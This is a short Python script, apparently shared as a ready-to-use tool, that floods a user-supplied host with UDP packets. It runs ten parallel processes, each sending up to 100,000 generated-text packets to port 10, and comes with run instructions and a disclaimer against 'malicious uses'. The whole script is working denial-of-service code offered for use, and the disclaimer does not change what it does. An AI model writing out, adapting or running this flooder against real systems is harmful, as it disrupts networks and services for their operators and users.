# Written by MsonC
# Please DO NOT use this script for any malicious uses!
# If you do I am not responsible for your actions
#
# You download it! you take responsiblibity for it!
# As I have stated this script is very powerful. However, That was on my internet and bandwidth
# Your situation may be completly different as in 3Mbps download in 1Mbps Upload. The script I belive (since I have not tested it within that envionment) wouln'd work nearly as well
# as my internet so please don't blame me because the only problem is your internet speed and bandwidth
# Thanks

import socket
import sys
from multiprocessing import Process

# How to run the program - python p0ke.py   host   stringlen
#                          python p0ke.py 192.168.1.1 60000
# Hit ctrl + C to stop

host = sys.argv[1]
b = sys.argv[2]
port = 10



mkstring = lambda(x): "".join(map(chr, (ord('a')+(y%26) for y in range(x))))
packet = mkstring(int(b))

def dos(host, port):

    a = 0
    while (a < 100000): # the loop will end at the number you set it to
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Set up socket connection for UDP AKA DGRAM
        s.sendto(packet, (host, port)) # Send the packet of randomly generated text to the user specifed IP

        a += 1 # Increment A by 1 So the while loop will not be infinite
        print (a)
    s.close() # Close the socket outside of the whileloop. Not sure why it works that way but it just does

if __name__ == '__main__':
    # origin_time = time.time()

    processes = list()
    for i in range(0, 10): # Make sure to change the number 10 to a lower number if you are useing too much CPU
        process = Process(target=dos, args=(host, port)) # Allocate the processes to the above code
        process.start() # Start the processes
        processes.append(process) # Add the proccesses to the list
    for process in processes:
        process.join()
